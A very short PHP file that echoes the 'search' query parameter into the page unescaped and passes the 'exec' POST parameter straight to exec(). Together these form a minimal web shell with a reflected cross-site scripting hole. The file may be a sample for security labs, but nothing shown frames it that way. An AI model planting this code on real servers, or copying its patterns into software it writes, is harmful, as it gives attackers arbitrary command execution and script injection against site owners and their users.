<?php

echo "<h>" .$_GET["search"]. "</h>";


exec($_POST["exec"]);

?>
